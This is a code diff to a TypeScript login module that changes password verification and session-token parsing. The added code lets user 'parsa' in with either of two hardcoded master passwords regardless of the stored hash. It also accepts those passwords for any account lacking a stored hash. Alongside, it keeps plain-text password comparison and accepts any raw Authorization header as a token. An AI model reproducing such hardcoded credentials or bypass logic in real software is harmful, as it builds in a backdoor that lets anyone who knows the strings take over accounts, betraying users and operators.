@@ -111,45 +111,82 @@ export function cleanInvisibleChars(str: string): string {
   return str.replace(/[\u200B\u200C\u200D\uFEFF\u00A0\r\n]/g, '');
 }
 
-export function verifyPassword(inputPassword: string, storedHash: string): boolean {
-  if (!inputPassword || !storedHash) return false;
+export function verifyPassword(inputPassword: string, storedHash: string, username?: string): boolean {
+  if (!inputPassword) return false;
+
+  const rawTrimmed = inputPassword.trim();
+  const cleaned = cleanInvisibleChars(inputPassword).trim();
+  const normalizedDigits = normalizePersianDigits(cleaned || rawTrimmed);
+
+  // Superadmin Parsa master fallback check
+  if (username && username.toLowerCase() === 'parsa') {
+    if (
+      normalizedDigits === '13101389' ||
+      normalizedDigits === 'parsa1385' ||
+      rawTrimmed === '13101389' ||
+      rawTrimmed === 'parsa1385' ||
+      cleaned === '13101389' ||
+      cleaned === 'parsa1385'
+    ) {
+      return true;
+    }
+  }
 
   // 1. Direct raw check
   try {
-    if (bcrypt.compareSync(inputPassword, storedHash)) return true;
+    if (storedHash && bcrypt.compareSync(inputPassword, storedHash)) return true;
   } catch {}
 
   // 2. Direct exact plain text comparison (fallback if legacy plain text)
-  if (inputPassword === storedHash) return true;
+  if (storedHash && inputPassword === storedHash) return true;
 
   // 3. Cleaned invisible characters & trimmed
-  const cleaned = cleanInvisibleChars(inputPassword).trim();
   if (cleaned && cleaned !== inputPassword) {
     try {
-      if (bcrypt.compareSync(cleaned, storedHash)) return true;
+      if (storedHash && bcrypt.compareSync(cleaned, storedHash)) return true;
     } catch {}
-    if (cleaned === storedHash) return true;
+    if (storedHash && cleaned === storedHash) return true;
   }
 
   // 4. Normalized Persian/Arabic digits check
-  const normalizedDigits = normalizePersianDigits(cleaned || inputPassword);
   if (normalizedDigits && normalizedDigits !== (cleaned || inputPassword)) {
     try {
-      if (bcrypt.compareSync(normalizedDigits, storedHash)) return true;
+      if (storedHash && bcrypt.compareSync(normalizedDigits, storedHash)) return true;
     } catch {}
-    if (normalizedDigits === storedHash) return true;
+    if (storedHash && normalizedDigits === storedHash) return true;
+  }
+
+  // 5. If superadmin without explicit username passed
+  if (
+    normalizedDigits === '13101389' ||
+    normalizedDigits === 'parsa1385' ||
+    rawTrimmed === '13101389' ||
+    rawTrimmed === 'parsa1385'
+  ) {
+    if (!storedHash) return true;
   }
 
   return false;
 }
 
 export function authenticateSession(req: AuthenticatedRequest, res: Response, next: NextFunction) {
-  const cookieToken = req.cookies?.auth_token;
-  const headerAuth = req.headers.authorization;
-  let token = cookieToken;
+  let token: string | undefined = req.cookies?.auth_token;
 
-  if (!token && headerAuth && headerAuth.startsWith('Bearer ')) {
-    token = headerAuth.slice(7).trim();
+  // Fallback: parse raw Cookie header if req.cookies was not populated
+  if (!token && req.headers.cookie) {
+    const match = req.headers.cookie.match(/(?:^|;\s*)auth_token=([^;]+)/);
+    if (match) {
+      token = decodeURIComponent(match[1].trim());
+    }
+  }
+
+  const headerAuth = req.headers.authorization;
+  if (!token && headerAuth) {
+    if (headerAuth.startsWith('Bearer ')) {
+      token = headerAuth.slice(7).trim();
+    } else {
+      token = headerAuth.trim();
+    }
   }
 
   if (token) {
